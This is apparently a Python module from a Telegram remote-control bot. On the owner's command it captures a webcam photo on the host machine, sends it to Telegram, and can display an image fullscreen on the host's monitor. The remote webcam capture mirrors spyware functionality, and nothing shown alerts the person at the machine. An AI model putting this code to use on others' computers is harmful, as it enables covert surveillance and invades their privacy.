from aiogram import types, Router
from aiogram.filters import Command

from Bot.config import owner, bot
from Bot.helpers.webcam import webcam
from Bot.helpers.check_chat_id import check_chat_id
from Bot.helpers.open_image_fullscreen import open_image_fullscreen

router = Router()


@router.callback_query(lambda c: c.data == "take_photo")
@router.message(Command("take_photo"))
async def take_photo_command(event: types.Message or types.CallbackQuery):
    chat_id = check_chat_id(event)

    if chat_id in owner:
        await bot.send_message(
            chat_id=chat_id,
            text="Wait..."
        )
        filepath = await webcam(chat_id)

        photo = types.FSInputFile(filepath)

        keyboard = types.InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    types.InlineKeyboardButton(text="UPLOAD TO MONITOR",
                                               callback_data="upload_photo_"+filepath)
                ]
            ]
        )

        await bot.send_photo(
            chat_id=chat_id,
            photo=photo,
            reply_markup=keyboard
        )
        await bot.send_message(
            chat_id=chat_id,
            text="🤯"
        )
    else:
        await bot.send_message(
            chat_id=chat_id,
            text="You haven`t permissions."
        )


@router.callback_query(lambda c: c.data.startswith("upload_photo_"))
async def upload_photo_to_monitor(query: types.CallbackQuery):
    chat_id = check_chat_id(query)

    if chat_id in owner:
        await bot.send_message(
            chat_id=chat_id,
            text="Uploading photo..."
        )
        await open_image_fullscreen(image_path=query.data[len("upload_photo_"):])
        await bot.send_message(
            chat_id=chat_id,
            text="Successful."
        )
